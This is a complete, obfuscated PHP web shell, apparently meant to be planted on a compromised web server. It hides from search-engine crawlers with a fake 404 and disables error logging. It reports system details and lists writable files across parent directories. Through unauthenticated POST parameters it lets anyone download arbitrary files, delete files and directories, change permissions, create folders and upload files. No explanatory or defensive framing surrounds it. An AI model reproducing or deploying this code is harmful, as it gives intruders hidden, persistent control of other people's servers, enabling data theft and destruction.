<?php
if (!empty($_SERVER['HTTP_USER_AGENT'])) { $sp0a90a3 = array('Google', 'Slurp', 'MSNBot', 'ia_archiver', 'Yandex', 'Rambler', 'StackRambler'); if (preg_match('/' . implode('|', $sp0a90a3) . '/i', @$_SERVER['HTTP_USER_AGENT'])) { header('HTTP/1.0 404 Not Found'); die; } } @ini_set('error_log', NULL); @ini_set('log_errors', 0); @ini_set('max_execution_time', 0); @set_time_limit(0); @set_magic_quotes_runtime(0); if (@get_magic_quotes_gpc()) { $_POST = n0182dfe8($_POST); } $sp8fbef3 = preg_split('/\\,(\\ +)?/', @ini_get('disable_functions')); define('DEFAULT_DIR_DEEP_BACK', '3'); if (isset($_POST['p1'])) { $_POST['p1'] = urldecode($_POST['p1']); } if (isset($_POST['p3'])) { $_POST['p3'] = urldecode($_POST['p3']); } if (@$_POST['p2'] == 'download') { if (@is_file($_POST['p1']) && @is_readable($_POST['p1'])) { ob_start('ob_gzhandler', 4096); header('Content-Disposition: attachment; filename=' . @basename($_POST['p1'])); if (function_exists('mime_content_type')) { $spb93dc2 = @n85ced157($_POST['p1']); header('Content-Type: ' . $spb93dc2); } else { header('Content-Type: application/octet-stream'); } $sp48b63b = @fopen($_POST['p1'], 'r'); if ($sp48b63b) { while (!@feof($sp48b63b)) { echo @fread($sp48b63b, 1024); } @fclose($sp48b63b); } } die; } elseif (@$_POST['p2'] == 'delete') { if (@is_dir($_POST['p1'])) { @n46aa46af($_POST['p1']); } else { @unlink($_POST['p1']); } } elseif (@$_POST['p2'] == 'chmod') { $sp3c7e91 = 0; for ($spe9a8f7 = strlen($_POST['p1']) - 1; $spe9a8f7 >= 0; --$spe9a8f7) { $sp3c7e91 += (int) $_POST['p3'][$spe9a8f7] * pow(8, strlen($_POST['p3']) - $spe9a8f7 - 1); } if (!@chmod($_POST['p1'], $sp3c7e91)) { echo 'Can\'t set permissions!<br>'; } } elseif (@$_POST['p2'] == 'mkdir') { if (!@mkdir($_POST['p1'])) { echo 'Can\'t create new dir<br><script>document.mf.p3.value="";</script>'; } } elseif (@$_POST['p2'] == 'uploadFile') { if (!@move_uploaded_file(@$_FILES['f']['tmp_name'], $_POST['p3'] . @$_FILES['f']['name'])) { echo 'Can\'t upload file!<br><script>document.mf.p3.value="";</script>'; } } if (isset($_REQUEST['sf']) and $_REQUEST['sf'] == 0) { $spe41149 = false; } else { $spe41149 = true; } if (isset($_REQUEST['showro']) and $_REQUEST['showro'] == 0) { $spbf9c1b = false; } else { $spbf9c1b = true; } echo '
<html>
<style>
body{background-color:#000028;color:#e1e1e1;}
body,td,th{ border:1px outset black;font: 9pt Lucida,Verdana;margin:0;vertical-align:top;color:#e1e1e1; }
table.info{ border-left:5px solid #df5;color:#fff;background-color:#000028; }
span,h1,a{ color: #df5 !important; }
span{ font-weight: bolder; }
div.content{ padding: 7px;margin-left:7px;background-color:#333; }
a{ text-decoration:none; }
a:hover{ text-decoration:underline; }
input{ margin:0;color:#fff;background-color:#555;border:1px solid #df5; font: 9pt Monospace,\'Courier New\'; }
#toolsTbl{ text-align:center; }
.toolsInp{ width: 300px }
.main th{text-align:left;background-color:#003300;}
.main tr:hover{border:2px outset gray;;background-color:#5e5e5e}
.l1{background-color:#444}
.l2{background-color:#333}
pre{font-family:Courier,Monospace;}
</style>
<script>
var p1_ = \'' . (strpos(@$_POST['p1'], '
') !== false ? '' : htmlspecialchars(@$_POST['p1'], ENT_QUOTES)) . '\';
var p2_ = \'' . (strpos(@$_POST['p2'], '
') !== false ? '' : htmlspecialchars(@$_POST['p2'], ENT_QUOTES)) . '\';
var p3_ = \'' . (strpos(@$_POST['p3'], '
') !== false ? '' : htmlspecialchars(@$_POST['p3'], ENT_QUOTES)) . '\';
var d = document;
function set(p1,p2,p3) {
	if(p1!=null)d.fm.p1.value=p1;else d.fm.p1.value=p1_;
	if(p2!=null)d.fm.p2.value=p2;else d.fm.p2.value=p2_;
	if(p3!=null)d.fm.p3.value=p3;else d.fm.p3.value=p3_;
}
function g(p1,p2,p3) {
	set(p1,p2,p3);
	d.fm.submit();
}
</script>
<!--
86a20c1b92a2d831b50ba9d62e18ed86
-->
<body>
<form method=post name=fm style=\'display:none;\'>
<input type=hidden name=p1>
<input type=hidden name=p2>
<input type=hidden name=p3>
</form>
'; if (!function_exists('posix_getpwuid') && !in_array('posix_getpwuid', $sp8fbef3)) { function posix_getpwuid($sp4eda9c) { return false; } } if (!function_exists('posix_getgrgid') && !in_array('posix_getgrgid', $sp8fbef3)) { function posix_getgrgid($sp4eda9c) { return false; } } $spfb7cec = @getcwd() . DIRECTORY_SEPARATOR; $spe9d35d = @diskfreespace($spfb7cec); $sp00686b = @disk_total_space($spfb7cec); $sp00686b = $sp00686b ? $sp00686b : 1; if (!function_exists('posix_getegid')) { $sp50fbaf = @get_current_user(); $sp518d6e = @getmyuid(); $sp020b79 = @getmygid(); $sp222239 = '?'; } else { $sp518d6e = @posix_getpwuid(@posix_geteuid()); $sp020b79 = @posix_getgrgid(@posix_getegid()); $sp50fbaf = $sp518d6e['name']; $sp222239 = $sp020b79['name']; $sp518d6e = $sp518d6e['uid'] ? $sp518d6e['uid'] : @posix_geteuid(); $sp020b79 = $sp020b79['gid'] ? $sp020b79['gid'] : @posix_getegid(); } $spec0aa4 = count(explode('/', @$_SERVER['REQUEST_URI'])) - 2; if ($spec0aa4 > DEFAULT_DIR_DEEP_BACK) { $spec0aa4 = DEFAULT_DIR_DEEP_BACK; } print '<table class=info cellpadding=3 cellspacing=0 width=100%><tr><td width=1><span>Uname:<br>User:<br>PHP:<br>Disabled:<br>HDD:<br>Site:<br>Root:<br>CWD:</span></td><td><nobr>' . @php_uname() . '</nobr><br>' . $sp518d6e . ' ( ' . $sp50fbaf . ' ) <span>Group:</span> ' . $sp020b79 . ' ( ' . $sp222239 . ' )<br>' . @phpversion() . ' <span>Safe mode:</span> ' . (@ini_get('safe_mode') ? '<font color=red>ON</font>' : '<font color=#00bb00><b>OFF</b></font>') . ' <a href=# onclick="g(\'\',\'info\')">[ phpinfo ]</a> ' . ' <span>Datetime:</span> ' . date('Y-m-d H:i:s') . '<br><nobr>' . implode(',', $sp8fbef3) . '</nobr><br>' . n25d3ae48($sp00686b) . ' <span>Free:</span> ' . n25d3ae48($spe9d35d) . ' (' . (int) ($spe9d35d / $sp00686b * 100) . '%)<br><a href="http://' . @$_SERVER['HTTP_HOST'] . '/">http://' . @$_SERVER['HTTP_HOST'] . '/</a><br>' . htmlspecialchars(realpath(@$_SERVER['DOCUMENT_ROOT']) . DIRECTORY_SEPARATOR) . '<br>' . htmlspecialchars($spfb7cec) . ' <a href=\'' . @$_SERVER['REQUEST_URI'] . '\'>[ home ]</a></td><td align=\'right\' width=10%><span>Server IP:</span><br>' . @$_SERVER['SERVER_ADDR'] . '<br><span>Client IP:</span><br>' . @$_SERVER['REMOTE_ADDR'] . "<br>deep = {$spec0aa4}</td></tr></table>\n"; if (isset($_POST['p2']) && $_POST['p2'] == 'info') { echo '<h1>PHP info</h1><div class=content><style>.p {color:#000;}</style><a href="' . @$_SERVER['REQUEST_URI'] . '">BACK</a>'; ob_start(); phpinfo(); $sp0224e5 = ob_get_clean(); $sp0224e5 = preg_replace('!(body|a:\\w+|body, td, th, h1, h2) {.*}!msiU', '', $sp0224e5); $sp0224e5 = preg_replace('!td, th {(.*)}!msiU', '.e, .v, .h, .h th {$1}', $sp0224e5); echo str_replace('<h1', '<h2', $sp0224e5) . '</div><br>'; die; } $sp6522ec = @n643462d4($spfb7cec, $spe41149); if ($spec0aa4 > 0) { $sp0eaeb3 = $spfb7cec . DIRECTORY_SEPARATOR . '..'; for ($spe9a8f7 = 1; $spe9a8f7 <= $spec0aa4; $spe9a8f7++) { $sp6522ec = array_unique(array_merge($sp6522ec, n97fe6a35("{$sp0eaeb3}", $spe41149))); $sp0eaeb3 = $sp0eaeb3 . DIRECTORY_SEPARATOR . '..'; } } print '<script>p1_=p2_=p3_="";</script>
<div class=content>
<table class="main" cellpadding="2" cellspacing="0" width="100%">
<tbody><tr><th>Status</th><th>Name</th><th>Size</th><th>Modify</th><th>Owner/Group</th><th>Permissions</th><th>Actions</th></tr>
'; $spf1eaf7 = 0; foreach ($sp6522ec as $sp0eaeb3) { if (@is_writable($sp0eaeb3)) { $sp24cdfe = '<font color=\'green\'>RW</font>'; } else { if ($spbf9c1b) { $sp24cdfe = '<font color=\'red\'>RO</font>'; } else { continue; } } $sp793652 = @posix_getpwuid(@fileowner($sp0eaeb3)); $sp222239 = @posix_getgrgid(@filegroup($sp0eaeb3)); $sp57287a = $sp793652['name'] ? $sp793652['name'] : @fileowner($sp0eaeb3); $spa8f034 = $sp222239['name'] ? $sp222239['name'] : @filegroup($sp0eaeb3); $sp3c7e91 = substr(sprintf('%o', @fileperms($sp0eaeb3)), -4); $sp78961f = date('Y-m-d H:i:s', @filemtime($sp0eaeb3)); if (@is_dir($sp0eaeb3)) { $sp933ccc = "[ {$sp0eaeb3} ]"; $sp11c377 = '<span>DIR</span>'; } else { $sp11c377 = n25d3ae48(@filesize($sp0eaeb3)); $sp933ccc = "{$sp0eaeb3}"; } print '<tr' . ($spf1eaf7 ? ' class=l1' : '') . "><td><span>{$sp24cdfe}</span></td><td><b><span>" . htmlspecialchars($sp933ccc) . "</span></b></td><td>{$sp11c377}</td><td>{$sp78961f}</td><td>{$sp57287a}/{$spa8f034}</td><td>{$sp3c7e91}</td><td>"; if (!@is_dir($sp0eaeb3)) { print '<a title="Download" href="#" onclick="g(\'' . urlencode($sp0eaeb3) . '\',\'download\')">D</a>'; } print ' <a title="Remove" href="#" onclick="g(\'' . urlencode($sp0eaeb3) . '\',\'delete\')">R</a></td></tr>
'; $spf1eaf7 = $spf1eaf7 ? 0 : 1; } print '
</tbody></table>
<table class=info id=toolsTbl cellpadding=3 cellspacing=0 width=100%  style=\'border-top:2px solid #333;border-bottom:2px solid #333;\'>
<tr><td><form method=post onsubmit="g(this.m.value,\'mkdir\');return false;"><span>Make dir:</span><br><input class=\'toolsInp\' type=text name=m value=\'' . htmlspecialchars($spfb7cec) . '\'><input type=submit value=\'>>\'></form></td></tr>
<tr><td><form method=post onsubmit="g(this.d.value,\'delete\');return false;"><span>Delete (file or dir):</span><br><input class=\'toolsInp\' type=text name=d><input type=submit value=\'>>\'></form></td></tr>
<tr><td><form method=post><span>Chmod:</span>
<input type=hidden name=p2 value=\'chmod\'><br>
File or dir : <input class=\'toolsInp\' type=text name=p1 value=\'' . htmlspecialchars($spfb7cec) . '\'><br>
<input type=text size=6 name=p3 value=\'0755\'>
<input type=submit value=\'>>\'></form></td></tr>
<tr><td><form method=\'post\' ENCTYPE=\'multipart/form-data\'>
<span>Upload file:</span><br>
<input type=hidden name=p2 value=\'uploadFile\'>
Path : <input class=\'toolsInp\' type=text name=p3 value=\'' . htmlspecialchars($spfb7cec) . '\'><br>
<input class=\'toolsInp\' type=file name=f>
<input type=submit value=\'>>\'></form><br></td></tr>
</table></div></html>
'; function n7d8f77be($sp0eaeb3) { $sp413b49 = @opendir($sp0eaeb3); while (false !== ($sp0b41bb = @readdir($sp413b49))) { $spb45eb1[] = $sp0b41bb; } return $spb45eb1; } function n643462d4($sp0eaeb3, $spe41149 = true) { if (!function_exists('scandir')) { $sp155be7 = array_diff(@n7d8f77be($sp0eaeb3), array('.', '..')); } else { $sp155be7 = array_diff(@scandir($sp0eaeb3), array('.', '..')); } foreach ($sp155be7 as $sp072233) { if ($sp072233 === '.' || $sp072233 === '..') { continue; } if (@is_file($sp0eaeb3 . DIRECTORY_SEPARATOR . $sp072233) && $spe41149) { $sp6c8dd5[] = @realpath($sp0eaeb3 . DIRECTORY_SEPARATOR . $sp072233); continue; } elseif (@is_dir($sp0eaeb3 . DIRECTORY_SEPARATOR . $sp072233)) { $sp6c8dd5[] = @realpath($sp0eaeb3 . DIRECTORY_SEPARATOR . $sp072233) . DIRECTORY_SEPARATOR; } else { continue; } foreach (@n643462d4($sp0eaeb3 . DIRECTORY_SEPARATOR . $sp072233, $spe41149) as $sp072233) { $sp6c8dd5[] = $sp072233; } } return $sp6c8dd5; } function n97fe6a35($sp0eaeb3, $spe41149 = true) { if (false == ($sp413b49 = @opendir($sp0eaeb3))) { return array(); } while (false !== ($sp0b41bb = @readdir($sp413b49))) { if ($sp0b41bb != '..' and @is_dir($sp0eaeb3 . DIRECTORY_SEPARATOR . $sp0b41bb)) { $spb45eb1[] = @realpath($sp0eaeb3 . DIRECTORY_SEPARATOR . $sp0b41bb) . DIRECTORY_SEPARATOR; } elseif ($spe41149 and $sp0b41bb != '..' and @is_file($sp0eaeb3 . DIRECTORY_SEPARATOR . $sp0b41bb)) { $spb45eb1[] = @realpath($sp0eaeb3 . DIRECTORY_SEPARATOR . $sp0b41bb); } } @closedir($sp413b49); return $spb45eb1; } function n46aa46af($sp0eaeb3) { foreach (glob($sp0eaeb3 . '/*') as $sp6c04b3) { if (@is_dir($sp6c04b3)) { n46aa46af($sp6c04b3); } else { @unlink($sp6c04b3); } } @rmdir($sp0eaeb3); } function n25d3ae48($sp05b784) { if ($sp05b784 >= 1073741824) { return sprintf('%1.2f', $sp05b784 / 1073741824) . ' GB'; } elseif ($sp05b784 >= 1048576) { return sprintf('%1.2f', $sp05b784 / 1048576) . ' MB'; } elseif ($sp05b784 >= 1024) { return sprintf('%1.2f', $sp05b784 / 1024) . ' KB'; } else { return $sp05b784 . ' B'; } } function n0182dfe8($sp16fcbd) { if (is_string($sp16fcbd)) { return stripslashes($sp16fcbd); } if (is_array($sp16fcbd)) { foreach ($sp16fcbd as $spe9a8f7 => $sp072233) { $sp16fcbd[$spe9a8f7] = n0182dfe8($sp072233); } } return $sp16fcbd; }